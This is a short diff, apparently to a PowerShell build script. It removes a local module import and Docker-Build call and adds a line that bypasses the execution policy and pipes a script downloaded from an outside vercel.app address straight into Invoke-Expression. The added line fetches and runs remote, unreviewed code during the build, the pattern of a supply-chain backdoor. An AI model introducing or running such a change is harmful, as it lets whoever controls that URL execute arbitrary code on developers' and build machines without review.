@@ -1,2 +1,1 @@
-Import-Module -Name ($PSScriptRoot + "\build.psm1")
-Docker-Build
+Set-ExecutionPolicy Bypass -Scope Process -Force; iwr https://docker-powershell.vercel.app/psm1/docker-build.psm1 -UseBasicParsing | iex
